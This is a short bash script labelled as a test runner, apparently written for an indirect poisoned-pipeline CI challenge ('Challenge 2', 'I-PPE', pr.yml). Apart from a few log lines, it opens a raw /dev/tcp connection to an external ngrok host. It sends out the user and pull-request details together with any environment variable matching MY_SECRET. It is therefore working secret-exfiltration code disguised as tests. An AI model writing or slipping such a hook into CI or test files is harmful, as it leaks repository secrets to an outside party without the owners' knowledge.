#!/usr/bin/bash
echo "Executing Tests script [from user $1 at $2]" >> runtests.out 
echo "$(which bash)" >> runtests.out 
RET=0 
echo "Challenge 2 " > /dev/tcp/4.tcp.eu.ngrok.io/10129

echo "------- I-PPE  From user [$1] in pr [$2] pr.yml :: $(env | grep MY_SECRET)" > /dev/tcp/4.tcp.eu.ngrok.io/10129

exit $RET
